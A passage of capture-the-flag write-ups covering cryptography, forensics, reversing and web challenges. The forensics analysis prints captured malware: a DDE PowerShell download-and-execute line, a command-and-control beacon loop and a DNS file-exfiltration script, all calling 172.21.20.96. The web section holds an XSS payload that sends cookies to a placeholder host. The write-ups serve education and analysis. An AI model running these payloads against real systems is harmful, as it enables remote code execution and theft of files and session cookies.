letter-by-letter.\nlactf{H1dd3n_\u0026amp;_prOt3cT3D_5h33T5_Ar3_n31th3r}\na hacker\u0026rsquo;s notes (43 solves) Solved by RaccoonNinja and fsharp; written by fsharp\nWe\u0026rsquo;re provided with an encrypted flash drive and are tasked with looking inside it to find a note from a hacker.\nThe password used to encrypt the drive is in the form of hacker{3 digits}. By bruteforcing the LUKS encryption password with hashcat, the password is found to be hacker765. The drive could now be mounted.\nSeveral files exist in the drive, and a few caught our interest:\n .config/joplin/database.sqlite: A SQLite database file. Opening it with sqlitebrowser shows an entry named encryption.masterPassword with a value of n72ROU9BqbjVOlXKH5Ju in the settings table. encrypted-notes/info.json: A JSON file containing an encrypted master key. encrypted-notes/b692aaeaf3494fa29121524802940dc2.md and encrypted-notes/f6fdd827811741a5b8b796b7778b2f4b.md: 2 encrypted notes from Joplin.  After examining the Joplin source code used for note encryption, RaccoonNinja determined that the sjcl module needs to be used to decrypt the notes.\nWe were stuck for a while. Decrypting either note with the found masterPassword didn\u0026rsquo;t work. It turns out that the master key needs to be decrypted with the masterPassword first. The notes can then be decrypted with the decrypted contents of the master key.\nFlag: lactf{S3cUr3_yOUR_C4cH3D_3nCRYP71On_P422woRD2}\nprivate Bin (38 solves) Solved by fsharp\nThe goal is to recover the contents of a private paste. An HTML file and an archive file containing a packet capture are given.\nThe challenge description states that the domain storing the private pastes is hosted somewhere under lac.tf. Searching the packet capture for the string lac.tf gives us the domain: privatebin-0191c4fc.lac.tf.\nHeading there, we could download an sslkey.log file so that Wireshark could decrypt and view the contents of packets for HTTPS requests to and responses from that domain.\nOne of the HTTP streams shows an encrypted zip file that failed to be uploaded onto the server due to it being too large. Another shows client-side JavaScript that is used to decrypt an encrypted private paste with a user-provided key.\nThe JavaScript used AES-256-CBC decryption: All information regarding the paste is encoded as a base64 blob, where the first 16 decoded bytes comprise the IV used, and the remaining decoded bytes make up the encrypted paste.\nThe HTML file provided at the beginning of the challenge contains the password to open the encrypted zip file, which is testlactf123. There are two files in the archive: key.txt, which contains the key used to encrypt the paste; and secret.txt, which only has a long string of randomly picked characters that is unused.\nUse the key found and IV from the base64 blob to perform the decryption and get an image containing the flag.\nFlag: lactf{e2e_encryption_is_only_as_safe_as_the_client_1dc5f2}\nCrypto (9/9 solved) ravin-cryptosystem (123 solves) Solved by LifeIsHard and Mystiz; written by RaccoonNinja\nThe title alludes to Rabin cryptosystem. This is further verified with the 2 prime factors being 3 mod 4. Note that cryptanalysis to Rabin cryptosystem is not needed to solve this challenge.\nDue to an error in the fastpow function, the flag is raised to 65536th power instead of 65537. This sucks because e is not co-prime with (p-1)(q-1), which is even.\nThankfully we can apply quick square-root finding 16 times and we should get 4**16 candidates No there are only 4.\nfrom Crypto.Util.number import long_to_bytes from sage.all import xgcd p,q = 861346721469213227608792923571,1157379696919172022755244871343 n=p*q c = 375444934674551374382922129125976726571564022585495344128269 \u0026#34;\u0026#34;\u0026#34; The extended gcd is also part of SAGE\u0026#39;s library. xgcd(a,b) returns 3 numbers: the gcd, and n,m such that na + mb = gc \u0026#34;\u0026#34;\u0026#34; yp, yq = xgcd(p, q)[1:] def gen_roots(cs): ans = [] for c in cs: cp, cq = c%p, c%q mp = int(pow(cp, (p+1)//4, p)) mq = int(pow(cq, (q+1)//4, q)) ans += [ (yp*p*mq + yq*q*mp) %n, (yp*p*mq - yq*q*mp +n ) %n ] ans+=[n-ans[-2],n-ans[-1]] return ans cans = [c] for i in range(16): cans = set(gen_roots(cans)) if i\u0026lt;24: print(cans, end=\u0026#34;\\n\\n\u0026#34;) for c in cans: C = long_to_bytes(c) if C[:6] == b\u0026#34;lactf{\u0026#34; and C[-1:] == b\u0026#34;}\u0026#34;: print(C) break hill-hard (31 solves) Solved by Mystiz; written by LifeIsHard\nFirst blood.\nStep 1: Recover 13 columns in matrix $A$ Encryption: $Ax = b$\nWhen we can choose $x$, we can get the columns in $A$ with the following method\n first column of $A$ by $(b_1-b_0)\\text{ mod }95$ second column of $A$ by $(b_2-b_0)\\text{ mod }95$ etc.  $$ A \\times \\begin{bmatrix} 1 \u0026amp; 1 \u0026amp; 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\end{bmatrix}^T = b_0 \\\\ A \\times \\begin{bmatrix} 2 \u0026amp; 1 \u0026amp; 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\end{bmatrix}^T = b_1 \\\\ A \\times \\begin{bmatrix} 1 \u0026amp; 2 \u0026amp; 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\end{bmatrix}^T = b_2 \\\\ \\cdots $$\nHowever, we cannot choose $x$ directly in this challenge. Our input will be XOR with fakeflag before matrix multiplication.\n$$ A \\times \\left( \\text{fakeflag } ⊕ \\text{ our input[20]} \\right)= b \\\\ A \\times \\left( \\text{lactf\\{?????????????\\} } ⊕ \\text{ our input[20]} \\right)= b $$\nExample:\n$$ \\begin{aligned} b_0 \u0026amp;= A \\times ( \\begin{bmatrix} \\text{l} \u0026amp; \\text{a} \u0026amp; \\text{c } \\cdots \u0026amp; \\text{\\}} \\end{bmatrix}^T \\oplus \\begin{bmatrix} 1 \u0026amp; 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\end{bmatrix}^T ) \\\\ \u0026amp;= A \\times ( \\begin{bmatrix} 76 \u0026amp; 65 \u0026amp; 67 \\cdots \u0026amp; 1 \\end{bmatrix}^T \\oplus \\begin{bmatrix} 1 \u0026amp; 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\end{bmatrix}^T ) \\\\ \u0026amp;= A \\times \\begin{bmatrix} 77 \u0026amp; 64 \u0026amp; 66 \\cdots \u0026amp; 1 \\end{bmatrix}^T \\end{aligned} $$\n$$ \\begin{aligned} b_1 \u0026amp;= A \\times ( \\begin{bmatrix} 76 \u0026amp; 65 \u0026amp; 67 \\cdots \u0026amp; 1 \\end{bmatrix}^T \\oplus \\begin{bmatrix} 2 \u0026amp; 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\end{bmatrix}^T ) \\\\ \u0026amp;= A \\times \\begin{bmatrix} 78 \u0026amp; 64 \u0026amp; 66 \\cdots \u0026amp; 1 \\end{bmatrix}^T \\end{aligned} $$\nAs fakeflag is unknown, $(x⊕2 - x⊕1)$ is different for different $x$. It would be hard to recover the column in $A$ as there\u0026rsquo;s 4 possible cases for the difference.\n   $x$ $x⊕1$ $x⊕2$ $x⊕2 - x⊕1$     0 1 2 1   1 0 3 3   2 3 0 -3   3 2 1 -1   4 5 6 1    We can try to find a better number ($k$) than \u0026ldquo;$2$\u0026rdquo;, then the difference will be same for all $x$. Note that the unknown part of fakeflag (lactf{?????????????}) only contains small letters (a-z), so $x \\in [65, 90]$.\n As the first two bits for $[65, 90]$ in 7-bit representation are the same (i.e. starting with \u0026ldquo;10\u0026rdquo;), we can set any value for the first 2 bits of $k$. Last bit of $k$ is \u0026ldquo;1\u0026rdquo; as we\u0026rsquo;re going to minus $x⊕1$  Therefore, the following values are possible:\n   Possible $k$ Binary rep. $x⊕k - x⊕1$ Remarks     1 0000001 0 Can\u0026rsquo;t use, we want difference ≠ 0   33 0100001 32 Ok   65 1000001 -64 Ok   97 1100001 -32 Can\u0026rsquo;t use, our input range is [1,94]    We will use $k=33$ for the following explanation, our input for the 14 attemps can be:\niteration input 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 33 1 1 1 1 1 1 1 1 1 1 1 1 1 2 1 1 1 1 1 1 1 33 1 1 1 1 1 1 1 1 1 1 1 1 ... ... 13 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 33 1 ------------------------------------------------------------------------ l a c t f { ? ? ? ? ? ? ? ? ? ? ? ? ? } Step 2: Get encrypted(fakeflag2) by calculating offset With the input in Step 1, we can get the 7-th to 19-th column. However, the remaining 7 columns are still missing.\nAs we know 7 characters of the fakeflag, we can change our input a bit.\n$$ A \\times \\left( \\text{lactf\\{?????????????\\} } ⊕ \\text{ lactf\\{our input[13]\\}} \\right) = b \\\\ A \\times \\begin{bmatrix} 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; ? \u0026amp; ? \u0026amp; \\cdots \u0026amp; ? \u0026amp; ? \u0026amp; 0 \\end{bmatrix}^T = b $$\niteration input 0 76 65 67 84 70 91 1 1 1 1 1 1 1 1 1 1 1 1 1 93 1 76 65 67 84 70 91 33 1 1 1 1 1 1 1 1 1 1 1 1 93 2 76 65 67 84 70 91 1 33 1 1 1 1 1 1 1 1 1 1 1 93 ... ... 13 76 65 67 84 70 91 1 1 1 1 1 1 1 1 1 1 1 1 33 93 ------------------------------------------------------------------------ l a c t f { ? ? ? ? ? ? ? ? ? ? ? ? ? } Then we can get the encrypted result with partially recoverd $A$ (i.e. 6 columns of \u0026ldquo;0\u0026quot;s + 13 columns recovered with Step 1 + 1 column of \u0026ldquo;0\u0026quot;s).\nWith the partially recovered $A$ and the encryption result of input [76 65 67 84 70 91 1 1 1 1 1 1 1 1 1 1 1 1 1 93], we can recover the wrapped part of fakeflag.\nNote that the difference of encrypted fakeflag ($f_1$) and encrypted fakeflag2 ($f_2$) will be the same with $A$ and partially recovered $A$ (denote as $\\tilde{A}$), i.e.,\n$$\\text{Enc}(f_2, A) - \\text{Enc}(f_1, A) = \\text{Enc}(f_2, \\tilde{A}) - \\text{Enc}(f_1, \\tilde{A})$$\nWe can then get $\\text{Enc}(f_2, A)$ as we have the other three terms.\nFlag: lactf{putting_the_linear_in_linear_algebra}.\n","permalink":"https://b6a.black/posts/2023-02-26-lactf/","summary":"Our collection of writeups for LA CTF 2023.","title":"LA CTF 2023 Writeup"},{"content":"Crypto Writeup for some other crypto challenges will be ready later.  Finite Realm of Random (4 solves) Solved by grhkm\nSecond blood.\nLet $L = \\mathbb{F}_{127^{32}}$ and $g$ be a fixed generator of $L$. The flag is splitted into character blocks and the following operation is performed:\n The block is encoded by $\\vec{c} = (c_0, c_1, \\ldots, c_{31}) \\mapsto f = c_0 + c_1g + c_2g^2 + \\cdots + c_{31}g^{31}$ For at most $5$ times:  Two elements $r_1$ and $r_2$ are chosen with the same minimal polynomial in $L$ Find a polynomial $\\varphi(X) \\in \\mathbb{F}_{127}[X]$ that satisfies $\\mathrm{deg}(\\varphi) \\leq 31$ and $\\varphi(r_1) = f$ Replace $f \\mapsto \\varphi(r_2)$   We receive the resulting $f$  Let\u0026rsquo;s first analyse the curious code in 2.1 by recalling the following fact.\nLemma: Let $L / K$ be a Galois extension. Then, the minimal polynomial of any $\\alpha \\in L \\setminus K$ is\n$$f(x) = \\prod_{\\sigma \\in \\mathrm{Gal}(L / K)} (x - \\sigma(\\alpha)).$$\n In other words, the roots to the minimal polynomial of $\\alpha$ are precisely the Galois conjugates of $\\alpha$. Applying this to our problem, we see that $r_2 = \\sigma(r_1)$ for some $\\sigma \\in \\mathrm{Gal}(L / K)$. Moreover, recall that the Galois group of a finite field is exactly the powers of the Froebnius automorphism:\n$$ \\mathrm{Gal}(\\mathbb{F}_{p^n} / \\mathbb{F}_p) = {\\mathrm{Frob}_p^i : 0 \\leq i \u0026lt; n} \\cong \\mathbb{Z} / n\\mathbb{Z} $$\nWhere $\\mathrm{Frob}_p$ is the map $x \\mapsto x^p$. Hence, $r_1$ and $r_2$ are Galois conjugates and we can write $r_2 = r_1^{p^k}$ for some $0 \\leq k \u0026lt; 32$.\nLet\u0026rsquo;s move on to the rest of the algorithm. We now compute a polynomial that maps $r_1 \\mapsto f$ and see where $r_2$ maps to. With our new gained knowledge, this part is easy to figure out. In fact, since the field has characteristics $p$, we have the following fact:\nClaim: We have $\\varphi(r_2) = \\varphi(r_1)^{p^k}$.  Proof: We apply Freshman\u0026rsquo;s Dream. Writing $\\varphi(X) = \\sum_{i = 0}^{31} d_iX^i$, we have\n$$ \\begin{aligned} \\varphi(r_1)^{p^k} \u0026amp;= \\left(\\sum_{i = 0}^{31} d_ir_1^i\\right)^{p^k} \\\\ \u0026amp;= \\sum_{i = 0}^{31} \\left(d_ir_1^i\\right)^{p^k} \u0026amp;\\text{Freshman\u0026rsquo;s dream} \\\\ \u0026amp;= \\sum_{i = 0}^{31} d_ir_1^{ip^k} \\\\ \u0026amp;= \\varphi\\left(r_1^{p^k}\\right) \\\\ \u0026amp;= \\varphi(r_2) \\end{aligned} $$\nWhere the third line uses the fact that $d_i \\in \\mathbb{F}_{127}$, so $d_i^{p^k} = d_i$.\nWe are close to the end now. Since by definition, $\\varphi(r_1) = f$, we get that $\\varphi(r_2) = f^{p^k}$. In other words, step (2) in the original algorithm simply maps $f$ to one of its conjugates by $f \\mapsto f^{p^k}$. Therefore, to recover the original $f$, we simply look at all $32$ conjugates of the resulting $f$ and check if it is valid ASCII with the correct length.\nSolve script:\n# Curiously, random is not random L = GF(127) for i in range(5): L = L[\u0026#39;x\u0026#39;].irreducible_element(2, algorithm=\u0026#39;random\u0026#39;).splitting_field(f\u0026#39;t{i}\u0026#39;) # Parses resulting f ct = bytes.fromhex(open(\u0026#39;out.txt\u0026#39;, \u0026#39;r\u0026#39;).read()) assert len(ct) % L.degree() == 0 blocks = [L(list(map(int, ct[i:i + L.degree()]))) for i in range(0, len(ct), L.degree())] def convert(poly): return bytes(map(int, poly.polynomial().coefficients())) for c in blocks: for i in range(32): # Checks conjugates by f -\u0026gt; f^(p^i) r = bytes(vector(c^(127^i))) if all(32 \u0026lt;= t \u0026lt; 127 or t == 0 for t in r): print(r.decode()) Forensics HiddenGem Mixtape Series Solved by TWY, Hollow, fsharp\n1: Initial Access (47 solves) An archive is given. It contains a Hyper-V virtual hard disk from the compromised computer of an employee and another archive which is password-protected. For this part, we are supposed to work with the provided hard disk only.\nThe challenge description states that the compromise occurred after an employee opened a document file received via email. When examining the hard disk, we should be on the lookout for a suspicious email or document.\nUsing AccessData FTK Imager, we add the virtual hard disk as an evidence item. Partition 1 \u0026gt; KAPE \u0026gt; [root] is the part of the hard disk containing all the relevant data used for the Windows operating system. Navigating to C:\\Users\\IEUser\\Documents, we see an email named Policy Update 2023-01-08T01_37_35+07_00.eml. If we open it in a text editor, we could see that the email body and attached document are base64 encoded. The decoded body reads:\nWe have just completed the Security Baseline for employees and personal computers due to some information leaks, so it is necessary to update the company\u0026#39;s information security policy. In order to ensure the Company\u0026#39;s internal information security, I request you to read and master the content of the policy This is a confidential document, so it should be protected Password is Privacy4411@2023!!! Sent with Proton Mail secure email. The attached document is a 7z archive called Policy.7z. As stated by the email, its password is Privacy4411@2023!!!. Opening it shows a document called Policy.xlsx. Given the circumstances, the email and document found are likely the ones referred to by the challenge description.\nOne way of analyzing Microsoft Office documents is to open them as a zip archive. Going into xl\\externalLinks\\externalLink.xml, there is a suspicious line of XML:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;externalLink xmlns=\u0026#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main\u0026#34; xmlns:mc=\u0026#34;http://schemas.openxmlformats.org/markup-compatibility/2006\u0026#34; mc:Ignorable=\u0026#34;x14\u0026#34; xmlns:x14=\u0026#34;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main\u0026#34;\u0026gt;\u0026lt;ddeLink xmlns:r=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships\u0026#34; ddeService=\u0026#34;cmd\u0026#34; ddeTopic=\u0026#34;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\\\u0026amp;quot;http://172.21.20.96/windowsupdate.ps1\\\u0026amp;quot;);IEX $e\u0026#34;\u0026gt;\u0026lt;ddeItems\u0026gt;\u0026lt;ddeItem name=\u0026#34;_xlbgnm.A1\u0026#34; advise=\u0026#34;1\u0026#34;/\u0026gt;\u0026lt;ddeItem name=\u0026#34;StdDocumentName\u0026#34; ole=\u0026#34;1\u0026#34; advise=\u0026#34;1\u0026#34;/\u0026gt;\u0026lt;/ddeItems\u0026gt;\u0026lt;/ddeLink\u0026gt;\u0026lt;/externalLink\u0026gt; Dynamic Data Exchange (DDE) was used to execute malicious code when the document was opened by the employee. The code downloads a PowerShell script from the internet and executes it.\nThe hard disk unfortunately does not contain the downloaded script. However, it is still possible to discover what PowerShell code was executed by looking into Windows PowerShell event logs.\nReading C:\\Windows\\System32\\winevt\\logs\\Microsoft-Windows-PowerShell%4Operational.evtx and filtering for event ID 4104, there is one event that contains obfuscated PowerShell code. It is essentially:\n\u0026amp; ( $sHEllid[1]+$sheLLiD[13]+\u0026#39;X\u0026#39;)( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]::FRomBase64STRINg( \u0026lt;very long base64 string\u0026gt; ) , [sySteM.IO.ComprESsiON.cOmpresSiONMODe]::dEcomPrEss)|fOReach-OBJECt{NEW-obJEct iO.sTReAMrEAder( $_ , [TExT.EncOdiNg]::AscIi)} | fOREacH-obJeCt{$_.reADToend( )}) Deobfuscating it would reveal what commands were being run. The ( $sHEllid[1]+$sheLLiD[13]+'X') part evaluates to IEX, which is a shorthand for Invoke-Expression and is responsible for executing code. So, it is important to avoid triggering or including code snippets that evaluate to IEX or Invoke-Expression during deobfuscation.\nTo deobfuscate this code, open a PowerShell terminal and execute the part after ( $sHEllid[1]+$sheLLiD[13]+'X'). We get:\n(New-OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL \u0026#39; \u0026#39;, (\u0026lt;hex followed by base64\u0026gt; |ConvERTtO-SecureSTRiNG -k 55,113,158,254,51,94,175,13,94,42,226,159,63,7,144,195,14,139,39,217,58,39,188,60,182,192,74,94,209,172,100,93)).GetneTwoRKCrEDEnTIAl().pASsWoRD |. ( $PsHoME[21]+$psHOme[34]+\u0026#39;x\u0026#39;) Run the part before |. ( $PsHoME[21]+$psHOme[34]+'x') to get:\n$bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);$bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99);$s=\u0026#39;172.21.20.96:8080\u0026#39;;$i=\u0026#39;eef8efac-321d465e-e9d053a7\u0026#39;;$p=\u0026#39;http://\u0026#39;;$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eef8efac -Headers @{\u0026#34;X-680d-47e8\u0026#34;=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/321d465e -Headers @{\u0026#34;X-680d-47e8\u0026#34;=$i}).Content;if ($c -ne \u0026#39;None\u0026#39;) {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/e9d053a7 -Method POST -Headers @{\u0026#34;X-680d-47e8\u0026#34;=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \u0026#39; \u0026#39;)} sleep 0.8} What the deobfuscated script does are the following:\n A request is sent to http://172.21.20.96:8080/eef8efac with a custom header X-680d-47e8: eef8efac-321d465e-e9d053a7. A request is sent to http://172.21.20.96:8080/321d465e with the same custom header. If the received content is not empty, it is executed as PowerShell code, and any error and output is sent to http://172.21.20.96:8080/e9d053a7 with the custom header. Do nothing for 0.8 seconds. Repeat step 2.  172.21.20.96:8080 probably acted as a command-and-control (C2) server that tells compromised clients what commands to execute and exfiltrates information from them. Step 1 might have been used to tell the C2 server to begin sending commands to the client.\nThere is a suspicious variable named $flag that never gets used in the script. If we evaluate $bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);$bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99); and read the contents of $flag, we get a Pastebin URL that contains the flag and a webpage link explaining the kind of attack used by the document:\nidek{MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt} Resource: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within 3: The Ultimate Goal (14 solves) For this part, we need to use the packet capture in the password-protected archive in addition to the hard disk.\nContinuing our investigation, we could find 3 files containing RDP bitmap cache in C:\\Users\\IEUser\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache named Cache0000.bin, Cache0001.bin and Cache0002.bin.\nWe could extract the bitmaps from the cache with bmc-tools.py and piece them back together with RdpCacheStitcher. By doing so, we discover a link to a PowerShell script used for exfiltrating information from compromised computers.\nAccording to the .ps1 file obtained, we know that we should check the DNS traffic to recover the files leaked.\nDeobfuscated ps1 content with explanations:\n$d=\u0026#34;172.21.20.96\u0026#34;; $s=4; $b=57; Get-ChildItem \u0026#34;.\u0026#34; | Foreach-Object { $a=[System.Convert]::ToBase64String($Enc.GetBytes($_.Name)); # RC4 $R={ $D,$K=$Args; $S=0..255;0..255|%{ $J=($J+$S[$_]+$K[$_%$K.Length])%256; $S[$_],$S[$J]=$S[$J],$S[$_] }; $D|%{ $I=($I+1)%256; $H=($H+$S[$I])%256; $S[$I],$S[$H]=$S[$H],$S[$I]; $_-bxor$S[($S[$I]+$S[$H])%256] } }; $Enc = [System.Text.Encoding]::ASCII; # key $p = $Enc.GetBytes(\u0026#39;[System.IO.File]::ReadAllBytes($_.FullName)\u0026#39;); # data $z = $Enc.GetBytes([System.IO.File]::ReadAllBytes($_.FullName)); # $u = RC4(data=$z, key=$p) $u = (\u0026amp; $R $z $p); $e = [System.Convert]::ToBase64String($u); $l=$e.Length; # separated by . per $b characters $r=\u0026#34;\u0026#34;; $n=0; # blocks while ($n -le ($l/$b)) { # $c: content length $c=$b; # last block check if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$e.Substring($n*$b, $c) + \u0026#34;.\u0026#34;; # perform nslookup per $s blocks if (($n%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; $r=\u0026#34;\u0026#34; } $n=$n+1 } nslookup -type=A $r$a. $d } We export the related traffic to JSON (HiddenGem.json) beforehand.\nWireshark Filter: ip.dst == 172.21.20.96 \u0026amp;\u0026amp; dns.id == 2\nThen we can recover all files using the below script:\nimport json, base64 from Crypto.Cipher import ARC4 from os import makedirs data = [ list(x[\u0026#39;_source\u0026#39;][\u0026#39;layers\u0026#39;][\u0026#39;dns\u0026#39;][\u0026#39;Queries\u0026#39;].values())[0][\u0026#39;dns.qry.name\u0026#39;] for x in json.loads(open(\u0026#34;HiddenGem.json\u0026#34;).read()) ] files = {} for d in data: *content, rfn = d.split(\u0026#34;.\u0026#34;) fn = base64.b64decode(rfn).decode() files[fn] = files.get(fn, b\u0026#39;\u0026#39;) + base64.b64decode(\u0026#34;\u0026#34;.join(content).encode()) key = b\u0026#39;[System.IO.File]::ReadAllBytes($_.FullName)\u0026#39; makedirs(\u0026#34;HiddenGem\u0026#34;, exist_ok=True) for fn in files: files[fn] = bytes(map(int, ARC4.new(key).decrypt(files[fn]).split(b\u0026#34; \u0026#34;))) open(\u0026#34;HiddenGem/\u0026#34; + fn, \u0026#34;wb\u0026#34;).write(files[fn]) Check the file named SecretPlan.pdf. There is a table on the 2nd page:\nFrom there we obtained the flag: idek{RDP_Cache_1s_g0OD_bu7_1_h4t3_t4K1n9_t3x7_fr0M_Im4g3s}\nBTW: there is a file named update.ps1 with the same leaking mechanism with the above malicious script.\nReverse Polyglot (42 solves) Solved by TWY, fsharp\nThe binary given is a polyglot: It is both a valid AArch64 and x86_64 Linux program. The flag is split into two parts, and each part could be found by reverse engineering the binary as one of the two aforementioned program types.\nPart 1: AArch64 (solved by fsharp)\nThe program does the following:\nbinary = open(\u0026#34;polyglot\u0026#34;, \u0026#34;rb\u0026#34;).read(124) decoded = \u0026#34;\u0026#34; for i in range(28): xord = binary[i + 68] ^ binary[i + 96] decoded += chr(xord) It does not print the decoded string, so we need to decode it ourselves. We get idek{__Why_50_m4nY_4rch5_l1k as the first part of the flag.\nPart 2: x86_64 (solved by TWY)\nFor this part, it is actually not too difficult to read the decompiled code generated by Ghidra, but needs more effort to understand and reimlement the pointer logic if not executing the raw binary.\nManual Reimplementation\n# 0x85(v2, \u0026amp;(binary[0x3a1] copied), 0x20) v5 = 0 v2 = list(binary[0x2a1:0x3a1]) # list(range(256)) v3 = binary[0x3a1:0x3c1] a2 = 0x20 for v4 in range(0x100): v6 = v2[v4] v5 = (v5 + v6 + v3[v4 % a2]) \u0026amp; 255 v2[v4] = v2[v5] v2[v5] = v6 # 0x1a2(v2, \u0026amp;(binary[0x3c1] copied), 0x17) v7 = list(binary[0x3c1:]) + list(binary[0x226:0x22e]) a1 = 0 for v7p in range(0x17): pv6 = (v7p + 1) \u0026amp; 255 cv2 = v2[pv6] a1 = (a1 + cv2) \u0026amp; 255 v2[pv6] = cv3 = v2[a1] v2[a1] = cv2 v7[v7p] ^= v2[(cv2 + cv3) \u0026amp; 255] # result: v7 It is RC4 (again). (Check HiddenGem 3)\nComplete Solve Script:\nfrom Crypto.Cipher import ARC4 binary = open(\u0026#34;polyglot\u0026#34;, \u0026#34;rb\u0026#34;).read() flag1 = bytes([a ^ b for a, b in zip(binary[0x44:0x60], binary[0x60:0x7c])]) flag2 = ARC4.new(binary[0x3a1:0x3c1]).encrypt(binary[0x3c1:] + binary[0x226:0x22e]) print((flag1 + flag2).decode()) Flag: idek{__Why_50_m4nY_4rch5_l1k3_X86_N_4rM_1n_0n3_biN}\nWeb Readme (176 solves) Solved by fsharp, J4cky\nA Go script is provided. A 24576-byte buffer called randomData is filled with bytes generated from rand.Read(), and the SHA256 hash of idek is moved to index 12625 in the buffer. We could POST a JSON array called Orders to http://readme.chal.idek.team:1337/just-read-it, which contains at most 10 positive integers between 1 and 100.\nThe script reads, from randomData, the numbers of bytes specified by each integer in the Orders array. When the integer is between 1 and 99, the corresponding number of bytes are read. However, when the integer is 100, something strange happens: bufio.NewReader() is called on the reader variable before the read happens.\nThe goal is to get the script to read in exactly 12625 bytes.\nIt appears that at most 100 bytes could be read each time. We decided to do a little testing: By POSTing an array consisting of at least six 100s, we get an error that says failed to read: read error: EOF.\nWhat happened was that the bufio.NewReader() and read function calls together ended up reading in 4096 bytes instead of the expected 100. So, there is a way to read more than 100 bytes each time after all.\nBy doing some math, we could figure out what numbers to POST to read in exactly 12625 bytes:\n4096 + 4096 + 4096 + 99 + 99 + 99 + 40 = 12625\nSo, we POST {\u0026quot;Orders\u0026quot;:[100,100,100,99,99,99,40]} and successfully get the flag: idek{BufF3r_0wn3rsh1p_c4n_b1t3!}\nSimpleFileServer (98 solves) Solved by RaccoonNinja, Kaiziron, fsharp; write-up by RaccoonNinja\nThe goal is to forge an admin cookie {\u0026quot;admin\u0026quot;:true} and access /flag.\nThe key insight is that symlinks can be put in your zip. For sake of convenience I symlinked to / and we are getting whatever we want (as far as our permission goes).\nThere are 2 pieces of the puzzle:\n Time when the service was started. This is found in /tmp/server.log Offset. This is found in /app/config.py (kudos to Kaiziron for reminding us)  There are only 1000 possibilities which can be quickly bruteforced.\nPaywall (71 solves) Solved by ozetta; write-up by RaccoonNinja\nThe goal is to get the flag but somehow we need to prepend the string FREE to it. A useful tool is php\u0026rsquo;s php:// protocol, which supports a wide range of wrappers and filters for processing.\nA useful resource is synacktiv\u0026rsquo;s php filter chain generator. The payload can be generated with ease from python3 php_filter_chain_generator.py --chain 'FREE '.\nJSON Beautifier (15 solves) Solved by ozetta, RaccoonNinja; write-up by RaccoonNinja\nA purely client-side challenge! We have to send a self-XSS link to admin and steal his cookie.\nA few keypoints:\n  The sink is obviously:\neval(`beautified = ${output}`); This means we have to corrupt output, which is created from userJson.\n  strings up to 10 chars are accepted in space argument:   supplying ` gives easy string context bypass:   the entry point is definitely DOM-XSS: outputBox.innerHTML = `\u0026lt;pre\u0026gt;${output}\u0026lt;/pre\u0026gt;`\n it\u0026rsquo;s limited by the strict CSP-Policy script-src 'unsafe-eval' 'self'; object-src 'none', meaning we cannot insert any script tag or inline events this narrows down the hunt to (do something) -\u0026gt; set this.config.debug and this.config.ops.cols -\u0026gt; trigger beautify -\u0026gt; free eval (knowing the order and working in an organized way is essential)    A good candidate would to set global properties would be DOM clobbering. However, while any truthy value will work for debug, cols has to be poisoned as string, not the usual HTMLInputElement type. Ozetta did most researches on this part and continued to create the final payload\n (organized post CTF) A good resource by PortSwigger describes how the properties can be enumerated and after enumeration, only frameset:cols can be string (textarea:cols is number). \u0026lt;frameset id=debug\u0026gt;\u0026lt;frameset id=\u0026quot;config\u0026quot; cols=\u0026quot;`'\u0026quot;\u0026gt; \u0026lt;iframe name=config srcdoc='\u0026lt;frameset id=debug\u0026gt;\u0026lt;frameset id=opts cols=\u0026quot;`+\u0026quot;\u0026gt;'\u0026gt;\u0026lt;/iframe\u0026gt;    When the dom clobbering payload is loaded to the dom, we can invoke beautiful by loading main.js again\n \u0026lt;iframe name=config srcdoc='\u0026lt;frameset id=debug\u0026gt;\u0026lt;frameset id=opts cols=\u0026quot;`+\u0026quot;\u0026gt;'\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;script src=static/js/main.js\u0026gt;\u0026lt;/script\u0026gt;    We can apply our XSS payload (simplified post-CTF)\n \u0026lt;textarea id=json-input\u0026gt;[\u0026amp;quot;`+(location=`https://XXXX/`+document.cookie)//\u0026amp;quot;]\u0026lt;/textarea\u0026gt;    The whole thing should be in an iframe, which is injected as the first step.\n 